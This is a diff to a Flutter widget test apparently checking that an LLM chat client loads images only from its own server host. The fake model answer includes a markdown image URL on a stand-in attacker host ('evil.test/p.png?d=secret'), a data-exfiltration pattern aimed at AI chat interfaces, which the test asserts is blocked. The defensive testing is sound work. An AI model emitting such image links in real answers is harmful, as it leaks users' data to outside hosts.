@@ -5,6 +5,7 @@ import 'package:flutter/material.dart';
 import 'package:flutter_test/flutter_test.dart';
 
 import '../support/fake_api.dart';
+import '../support/pixels.dart';
 import '../support/pump.dart';
 
 Finder control(String label) => find.byWidgetPredicate(
@@ -142,17 +143,18 @@ void main() {
   testWidgets('an image loads only from the server\'s own host', (
     tester,
   ) async {
-    await pumpApp(
-      tester,
-      llm: _answering(
-        'Card:\n\n[![Report](https://h:8445/card.png)](https://h:8445/r)\n\n'
-        'Elsewhere: ![tracker](https://evil.test/p.png?d=secret)\n\n'
-        'Plain: ![plain](http://h:80/p.png?d=secret)',
-      ),
-    );
+    final llm = _answering(
+      'Card:\n\n[![Report](https://h:8445/card.png)](https://h:8445/r)\n\n'
+      'Elsewhere: ![tracker](https://evil.test/p.png?d=secret)\n\n'
+      'Plain: ![plain](http://h:80/p.png?d=secret)',
+    )..images[Uri.parse('https://h:8445/card.png')] = [pixel];
+    await pumpApp(tester, llm: llm);
     await tester.pumpAndSettle();
     expect(find.byType(Image), findsOneWidget);
     expect(find.text('[tracker: evil.test]'), findsOneWidget);
     expect(find.text('[plain: h]'), findsOneWidget);
+    expect(llm.calls.where((c) => c.startsWith('answerImage')), [
+      'answerImage:https://h:8445/card.png',
+    ]);
   });
 }
